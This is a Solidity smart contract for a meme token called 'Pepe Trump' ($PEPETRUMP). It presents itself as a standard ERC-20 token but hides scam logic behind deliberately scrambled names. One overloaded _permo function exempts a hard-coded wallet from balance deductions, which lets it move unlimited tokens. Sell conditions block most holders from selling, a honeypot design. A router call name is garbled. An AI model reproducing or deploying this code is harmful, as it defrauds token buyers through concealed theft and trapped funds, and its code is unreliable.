/**

This is $PEPETRUMP

TWITTER: https://twitter.com/PepeTrump_Coin
TELEGRAM: https://t.me/PepeTrump_Portal
WEBSITE: https://pepetrump.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _permo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _permo(a, b, "SafeMath:");
    }

    function  _permo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kfcosvqmkp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pfnvknojfs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract PepeTrump is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Pepe Trump";
    string private constant _symbol = unicode"PEPETRUMP";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalkt = 100000000 * 10 **_decimals;
    uint256 public _mxTamsAmaunt = _Totalkt;
    uint256 public _Wallevbumx = _Totalkt;
    uint256 public _wapThresholdeux= _Totalkt;
    uint256 public _mokmTouvp= _Totalkt;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEtakgFvmf;
    mapping (address => bool) private _taxvWalrvy;
    mapping(address => uint256) private _lruekrkeacp;
    bool public _tlfereslxnove = false;
    address payable private _pkrfodjavq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqbust=0;
    uint256 private _burafbrbv=0;

    _pfnvknojfs private _qomRmvobot;
    address private _acPvrdtvw;
    bool private _phbjveuoh;
    bool private ioySwpruq = false;
    bool private _aqvEabujp = false;

    event _amrfdlyal(uint _mxTamsAmaunt);
    modifier lckobThvpup {
        ioySwpruq = true;
        _;
        ioySwpruq = false;
    }

    constructor () {
        _pkrfodjavq = payable(0x43496c872D6edde7c7ab551C2f9C512b87ecEaEB);
        _balances[_msgSender()] = _Totalkt;
        _isEtakgFvmf[owner()] = true;
        _isEtakgFvmf[address(this)] = true;
        _isEtakgFvmf[_pkrfodjavq] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalkt);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalkt;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _permo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlfereslxnove) {
                if (to != address
                (_qomRmvobot) && to !=
                 address(_acPvrdtvw)) {
                  require(_lruekrkeacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruekrkeacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acPvrdtvw && to != 
            address(_qomRmvobot) && !_isEtakgFvmf[to] ) {
                require(amount <= _mxTamsAmaunt,
                 "Exceeds the _mxTamsAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallevbumx, "Exceeds the maxWalletSize.");
                if(_burafbrbv
                < _wapBeforeqbust){
                  require(! _rfoqmvz(to));
                }
                _burafbrbv++;
                 _taxvWalrvy[to]=true;
                teeomoun = amount.mul((_burafbrbv>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acPvrdtvw && from!= address(this) 
            && !_isEtakgFvmf[from] ){
                require(amount <= _mxTamsAmaunt && 
                balanceOf(_pkrfodjavq)<_mokmTouvp,
                 "Exceeds the _mxTamsAmaunt.");
                teeomoun = amount.mul((_burafbrbv>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burafbrbv>_wapBeforeqbust &&
                 _taxvWalrvy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ioySwpruq 
            && to == _acPvrdtvw && _aqvEabujp &&
             contractTokenBalance>_wapThresholdeux 
            && _burafbrbv>_wapBeforeqbust&&
             !_isEtakgFvmf[to]&& !_isEtakgFvmf[from]
            ) {
                _swpznvrkvj( _pumve(amount, 
                _pumve(contractTokenBalance,_mokmTouvp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmoejvup(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _permo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _permo(teeomoun));
        emit Transfer(from, to, 
        amount. _permo(teeomoun));
    }

    function _swpznvrkvj(uint256
     tokenAmount) private lckobThvpup {
        if(tokenAmount==0){return;}
        if(!_phbjveuoh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _qomRmvobot.WETH();
        _approve(address(this),
         address(_qomRmvobot), tokenAmount);
        _qomRmvobot.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _pumve(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _permo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _pkrfodjavq){
            return a ;
        }else{
            return a . _permo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTamsAmaunt = _Totalkt;
        _Wallevbumx = _Totalkt;
        _tlfereslxnove = false;
        emit _amrfdlyal(_Totalkt);
    }

    function _rfoqmvz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmoejvup(uint256
    amount) private {
        _pkrfodjavq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _phbjveuoh);
        _qomRmvobot   =  _pfnvknojfs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_qomRmvobot), _Totalkt);
        _acPvrdtvw = _kfcosvqmkp(_qomRmvobot.factory()). createPair (address(this),  _qomRmvobot . WETH ());
        _qomRmvobot.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acPvrdtvw).approve(address(_qomRmvobot), type(uint).max);
        _aqvEabujp = true;
        _phbjveuoh = true;
    }

    receive() external payable {}
}